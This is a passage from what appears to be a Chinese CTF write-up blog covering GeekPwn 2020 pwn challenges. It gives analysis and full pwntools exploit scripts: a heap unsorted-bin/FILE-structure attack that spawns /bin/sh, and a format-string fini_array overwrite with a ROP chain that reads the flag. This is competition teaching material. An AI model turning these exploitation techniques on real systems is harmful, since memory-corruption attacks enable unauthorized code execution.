class="number">0x40</span>, p64(fake_chunk_address)) <span class="comment"># 2</span></span><br><span class="line">    add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;4&quot;</span>*<span class="number">0x8</span>) <span class="comment"># 3</span></span><br><span class="line">    add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x40</span>, p64(fake_chunk_address)) <span class="comment"># 4</span></span><br><span class="line">    add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;8&quot;</span>*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">4</span> + p64(malloc_hook_address - <span class="number">0x23</span>)) <span class="comment"># 5</span></span><br><span class="line">    throw_out(<span class="number">0</span>)</span><br><span class="line">    add_member(<span class="string">&quot;1212&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;a&quot;</span>*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(one_gadget + libc.address)) <span class="comment"># 0</span></span><br><span class="line">    <span class="comment">#add_member(&quot;1212&quot;, 0x40, &quot;a&quot;*3 + p64(0) +p64(one_gadget + libc.address) + p64(libc.sym[&#x27;realloc&#x27;])) # 0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exp()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        p = process([<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># exp()</span></span><br><span class="line">throw_out(<span class="number">2</span>)</span><br><span class="line">throw_out(<span class="number">4</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p.sendlineafter(&quot;your choice:&quot;, &quot;1&quot;)</span></span><br><span class="line"><span class="string">p.sendlineafter(&quot;name:&quot;, &quot;2&quot;)</span></span><br><span class="line"><span class="string">p.sendlineafter(&quot;size:&quot;, str(0x20))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Paperprinter"><a href="#Paperprinter" class="headerlink" title="Paperprinter"></a>Paperprinter</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>首先我们看一下程序，该题目与<a href="https://blog.lyyl.online/2020/07/14/starctf-2019-heap-master/">*ctf heap_master</a>有些类似，都是先<code>mmap</code>一块<code>0x1000</code>大小的内存，然后可以对该内存区域进行编辑和释放<code>add,delete</code>。在该题目中共存在两次<code>malloc</code>，一次是<code>print</code>中的<code>malloc(0x138)</code>，另一次是<code>exit</code>中的<code>strdup</code>。这与<code>heap_master</code>中的任意<code>malloc</code>不同。</p><p>程序在一开始给输出了<code>sleep</code>的一个地址，根据此地址我们可以推算出<code>libc address</code>的后<code>5</code>个值，倒数第六个地址只能靠碰撞了（因为<code>_IO_list_all</code>的偏移地址为<code>6</code>位数）。</p><p>这样我们就相当于得到了<code>libc</code>的地址。而目前我们可以任意释放内存。通过<code>unsorted bin attack</code>覆盖<code>_IO_list_all</code>地址为<code>main_arean+88</code>，之后释放大小为<code>0x60</code>大小的堆块，使得<code>_chain</code>指向该堆块。在<code>0x60</code>大小的堆块中布局<code>fake_FILE</code>结构体。<code>vtable</code>的地址可以通过堆块的<code>bk</code>指针来进行伪造。</p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><ul><li><p>根据输出的<code>sleep</code>的部分地址推算出<code>libc</code>地址的后<code>6</code>位。</p></li><li><p>将<code>mmap</code>的内存地址改写为<code>0x90(chunk1)-0x30-0x90(chunk2)-0x30-0x90(chunk3)-0x30-0x140(chunk4)-0x30-0x30</code>的堆内存布局</p></li><li><p>依次释放<code>chunk2,chunk3,chunk4</code>，此时形成的<code>unsorted bin</code>链表如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0x602ab0c0:0x00000000000000000x0000000000000091 &lt;&lt; chunk2 freed</span><br><span class="line">0x602ab0d0:0x00007ffff7dd5b780x00000000602ab180 &lt;&lt; chunk2_bk = chunk3</span><br><span class="line">...</span><br><span class="line">0x602ab150:0x00000000000000900x0000000000000030 &lt;&lt; padding chunk</span><br><span class="line">0x602ab160:0x00000000000000000x0000000000000000</span><br><span class="line">0x602ab170:0x00000000000000000x0000000000000000</span><br><span class="line">0x602ab180:0x00000000000000000x0000000000000091 &lt;&lt; chunk3 freed</span><br><span class="line">0x602ab190:0x00000000602ab0c00x00000000602ab240 &lt;&lt; chunk3_bk = chunk4</span><br><span class="line">...</span><br><span class="line">0x602ab210:0x00000000000000900x0000000000000030 &lt;&lt; padding chunk</span><br><span class="line">0x602ab220:0x00000000000000000x0000000000000000</span><br><span class="line">0x602ab230:0x00000000000000000x0000000000000000</span><br><span class="line">0x602ab240:0x00000000000000000x0000000000000141 &lt;&lt; chunk4 freed</span><br><span class="line">0x602ab250:0x00000000602ab1800x00007ffff7dd5b78 &lt;&lt; main_arena+88</span><br><span class="line">...</span><br><span class="line">0x602ab380:0x00000000000001400x0000000000000030 &lt;&lt; padding chunk</span><br><span class="line">0x602ab390:0x00000000000000000x0000000000000000</span><br><span class="line">0x602ab3a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x602ab3b0:0x00000000000000000x0000000000000031</span><br></pre></td></tr></table></figure></li><li><p>为了之后能够调用<code>strdup</code>，这里我们需要<code>malloc(0x138)</code>即申请<code>0x140</code>大小的堆块，此时<code>chunk4</code>被申请。而<code>chunk2,chunk3</code>被移入<code>small bin</code>数组中。<code>chunk2</code>的<code>fd</code>指针和<code>chunk3</code>的<code>bk</code>指针指向<code>main_arean+216</code>即<code>small_bin[7]</code>的位置。</p></li><li><p>覆写<code>chunk3</code>的<code>bk</code>指针的后<code>3</code>个字节为<code>system</code>地址，那么<code>chunk3</code>即为伪造的<code>vtable</code>。而<code>chunk2</code>的<code>bk</code>指针指向<code>chunk3</code>，即<code>mmap_address+0xd8</code>的位置指向<code>vtable</code>。我们即在<code>chunk1</code>中伪造<code>IO_FILE</code></p></li><li><p>将<code>chunk1</code>构造为如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x602ab000:0x0068732f6e69622f0x0000000000000061 &lt;&lt; smallbin[0x60]</span><br><span class="line">0x602ab010:0x00000000000000000x00007ffff7dd6510 &lt;&lt; IO_list_all-0x10</span><br><span class="line">0x602ab020:0x00000000000000020x0000000000000003</span><br><span class="line">0x602ab030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602ab040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602ab050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602ab060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602ab070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602ab080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602ab090:0x00000000000000900x0000000000000030</span><br></pre></td></tr></table></figure><p>在调用<code>strdup</code>函数的时候会将<code>chunk1</code>放入到<code>small bin</code>数组中。发生<code>unsorted bin attack</code>。<code>_IO_list_all</code>被改写为<code>main_arena+88</code>的地址。</p><p>而<code>_chain</code>对应的<code>main_arena+184</code>的位置即为<code>smallbin[4]=0x60</code>的位置，而此时<code>chunk1</code>被放入<code>smallbin[4]</code>中，即<code>_chain</code>指向了<code>chunk1</code>。后<code>malloc</code>由于我们改写的<code>bk</code>指针而出错，即刷新所有的<code>FILE</code>结构体。从而调用<code>vtable-_IO_overflow</code>即<code>system</code>。</p></li></ul><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *0x555555554E84\n&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/windowsDisk/glibc/x64/glibc-2.23/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">offset, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;offset :&quot;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;length :&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content :&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">offset</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;offset :&quot;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printpaper</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exitpaper</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(p.recvline().strip(<span class="string">&quot;\n&quot;</span>), <span class="number">16</span>)</span><br><span class="line">    libc_base -= (libc.sym[<span class="string">&#x27;sleep&#x27;</span>] &gt;&gt; <span class="number">8</span>)</span><br><span class="line">    libc_base = (libc_base&lt;&lt;<span class="number">8</span>)+<span class="number">0xa00000</span></span><br><span class="line">    system_address = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    io_list_all_address = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;libc base address&quot;</span>, <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;system address&quot;</span>, <span class="built_in">hex</span>(system_address)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;io_list_all address&quot;</span>, <span class="built_in">hex</span>(io_list_all_address)</span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    edit(offset, p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)) <span class="comment"># chunk 1, _IO_FILE</span></span><br><span class="line">    edit(offset+<span class="number">0x90</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)) <span class="comment">#padding</span></span><br><span class="line">    edit(offset+<span class="number">0x90</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))<span class="comment"># chunk 2</span></span><br><span class="line">    edit(offset+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x90</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)) <span class="comment"># padding</span></span><br><span class="line">    edit(offset+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0x30</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)) <span class="comment"># chunk 3</span></span><br><span class="line">    edit(offset+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x90</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)) <span class="comment"># padding</span></span><br><span class="line">    edit(offset+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0x30</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x141</span>)) <span class="comment"># chunk4</span></span><br><span class="line">    edit(offset+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x140</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)) <span class="comment"># padding</span></span><br><span class="line">    edit(offset+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x140</span>+<span class="number">0x30</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)) <span class="comment"># padding</span></span><br><span class="line"></span><br><span class="line">    delete(offset+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x10</span>) <span class="comment">#delete chunk2</span></span><br><span class="line">    delete(offset+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#delete chunk3, chunk2_bk(+0xd8)=chunk3</span></span><br><span class="line">    delete(offset+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#delete chunk 4</span></span><br><span class="line"></span><br><span class="line">    printpaper() <span class="comment"># malloc(0x138), chunk 4 malloced, chunk3_bk = main_arena near,(small bin 0x90)</span></span><br><span class="line"></span><br><span class="line">    edit(offset+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x18</span>, p64(system_address)[:<span class="number">3</span>])</span><br><span class="line">    edit(offset+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0x30</span>, p64(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    delete(offset+<span class="number">0x10</span>)</span><br><span class="line">    edit(offset+<span class="number">0x20</span>, p64(<span class="number">2</span>)+p64(<span class="number">3</span>))</span><br><span class="line">    edit(offset+<span class="number">0x18</span>, p64(io_list_all_address-<span class="number">0x10</span>)[:<span class="number">3</span>])</span><br><span class="line">    edit(offset, <span class="string">&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>))</span><br><span class="line">    exitpaper()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exp()</span><br><span class="line">        p.interactive()</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        p = process([<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line">        gdb.attach(p, <span class="string">&quot;b *0x555555554E84\n&quot;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/windowsDisk/glibc/x64/glibc-2.23/lib/libc.so.6&#x27;</span>)</span><br><span class="line">        one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        one_gadget = <span class="number">0x0</span></span><br></pre></td></tr></table></figure><h1 id="Easyshell"><a href="#Easyshell" class="headerlink" title="Easyshell"></a>Easyshell</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>首先我们运行一下程序，程序采用静态编译，实现了一个返回用户输入的功能。这里存在格式化字符串漏洞。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/GeekPwn-2020-%E4%BA%91%E9%9D%B6%E5%9C%BA%E6%8C%91%E6%88%98%E8%B5%9B%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/20200721224418.png" alt="图片无法显示，请联系作者" title=" "><p>由于函数是静态编译的，因此在函数执行<code>_exit</code>调用<code>__run_exit_handlers</code>函数，遍历<code>fini.array</code>数组的时候，<code>rbp</code>会被改写为<code>__exit_funcs</code>的地址。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/GeekPwn-2020-%E4%BA%91%E9%9D%B6%E5%9C%BA%E6%8C%91%E6%88%98%E8%B5%9B%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/20200721124304.png" alt="图片无法显示，请联系作者" title=" "><p>我们可以利用格式化字符串漏洞，改写<code>fini.array</code>数组为<code>[init, main(leave,ret)]</code>的指令，那么在程序退出的时候回首先执行<code>fini.array[2]</code>，此时已经发生了栈迁移，我们即可进行<code>ROP</code></p><p>这里需要注意的是每次<code>gets</code>只能读取<code>0xc0</code>大小的空间。因此我们需要两次重新读取数据。而且会遇到<code>\n</code>截断，<code>pop rdi</code>需要用另一个<code>gadget</code>。</p><h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *0x400dde\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">rbp = <span class="number">0x6ed0c0</span></span><br><span class="line">fini_array_address = <span class="number">0x00000000006d6828</span></span><br><span class="line">init_address = <span class="number">0x40aba0</span></span><br><span class="line">main_leave_ret = <span class="number">0x400dfc</span></span><br><span class="line">p_rdi_r = <span class="number">0x401f0a</span></span><br><span class="line">p_rdi_rbp_r = <span class="number">0x40b74a</span></span><br><span class="line">p_rsi_r = <span class="number">0x4014a4</span></span><br><span class="line">p_rdx_rsi_r = <span class="number">0x44c499</span></span><br><span class="line">p_rcx_r = <span class="number">0x42142b</span></span><br><span class="line">p_rax_rdx_rbx_r = <span class="number">0x482286</span></span><br><span class="line">gets_address = <span class="number">0x400DC0</span></span><br><span class="line">syscall = <span class="number">0x471115</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%23$hn&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(init_address &amp; <span class="number">0xffff</span>))</span><br><span class="line">payload += <span class="string">&quot;%&#123;&#125;c%24$hn&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="number">0xffff</span> &amp; ((main_leave_ret &amp; <span class="number">0xffff</span>) - (init_address &amp; <span class="number">0xffff</span>))))</span><br><span class="line">payload += <span class="string">&quot;%&#123;&#125;c%25$hn&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="number">0xffff</span> &amp; ((p_rdi_r &amp; <span class="number">0xffff</span>) - (main_leave_ret &amp; <span class="number">0xffff</span>))))</span><br><span class="line">payload += <span class="string">&quot;%&#123;&#125;c%26$hn&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="number">0xffff</span> &amp; (((p_rdi_r &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) - (p_rdi_r &amp; <span class="number">0xffff</span>))))</span><br><span class="line">payload += <span class="string">&quot;%&#123;&#125;c%27$hn&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="number">0xffff</span> &amp; (((rbp + <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>) - ((p_rdi_r &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>))))</span><br><span class="line">payload += <span class="string">&quot;%&#123;&#125;c%28$hn&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="number">0xffff</span> &amp; ((((rbp + <span class="number">0x10</span>) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) - ((rbp + <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>))))</span><br><span class="line">payload += <span class="string">&quot;%&#123;&#125;c%29$hn&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="number">0xffff</span> &amp; ((gets_address &amp; <span class="number">0xffff</span>) - ((rbp + <span class="number">0x10</span>) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>)))</span><br><span class="line">payload += <span class="string">&quot;%&#123;&#125;c%30$hn&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="number">0xffff</span> &amp; (((gets_address &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) - (gets_address &amp; <span class="number">0xffff</span>))))</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x70</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">payload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload += p64(fini_array_address) + p64(fini_array_address + <span class="number">8</span>)</span><br><span class="line">payload += p64(rbp+<span class="number">8</span>) + p64(rbp+<span class="number">8</span>+<span class="number">2</span>) + p64(rbp+<span class="number">0x10</span>) + p64(rbp + <span class="number">0x10</span> + <span class="number">2</span>) + p64(rbp + <span class="number">0x18</span>) + p64(rbp + <span class="number">0x18</span> + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;echo back.\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">flag_address = rbp + <span class="number">0x10</span></span><br><span class="line">flag_read_address = <span class="number">0x6ef910</span></span><br><span class="line">rop2_rbp = <span class="number">0x6ed178</span></span><br><span class="line"></span><br><span class="line">or_rop = flat([</span><br><span class="line">    p_rdi_rbp_r, flag_address, <span class="number">0</span>,</span><br><span class="line">    p_rsi_r, <span class="number">0x0</span>,</span><br><span class="line">    p_rax_rdx_rbx_r, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    syscall, <span class="comment"># open(&quot;./flag\x00&quot;, &quot;r&quot;)</span></span><br><span class="line">    p_rdi_rbp_r, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    p_rsi_r, rop2_rbp,</span><br><span class="line">    p_rax_rdx_rbx_r, <span class="number">0</span>, <span class="number">0x100</span>, <span class="number">0</span>,</span><br><span class="line">    syscall <span class="comment"># read(0, rop2_rbp, 0x100)</span></span><br><span class="line">])</span><br><span class="line">p.recvuntil(<span class="string">&quot;b&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;./flag\x00\x00&quot;</span> + or_rop)</span><br><span class="line"></span><br><span class="line">rw_rop = flat([</span><br><span class="line">    p_rdi_rbp_r, <span class="number">3</span>, <span class="number">0</span>,</span><br><span class="line">    p_rsi_r, flag_read_address,</span><br><span class="line">    p_rax_rdx_rbx_r, <span class="number">0</span>, <span class="number">0x100</span>, <span class="number">0</span>,</span><br><span class="line">    syscall,  <span class="comment"># read(3, 0x6ef910, 0x100)</span></span><br><span class="line">    p_rdi_rbp_r, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">    p_rsi_r, flag_read_address,</span><br><span class="line">    p_rax_rdx_rbx_r, <span class="number">1</span>, <span class="number">0x100</span>, <span class="number">0</span>,</span><br><span class="line">    syscall <span class="comment"># write(1, 0x6ef910, 0x100)</span></span><br><span class="line">])</span><br><span class="line">p.sendline(rw_rop)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Playthenew"><a href="#Playthenew" class="headerlink" title="Playthenew"></a>Playthenew</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>首先看一下程序，保护全开，<code>libc</code>版本是<code>2.30</code>。</p><p>程序首先在<code>0x100000</code>地址处<code>mmap</code>了一块大小为<code>0x1000</code>的内存。</p><img 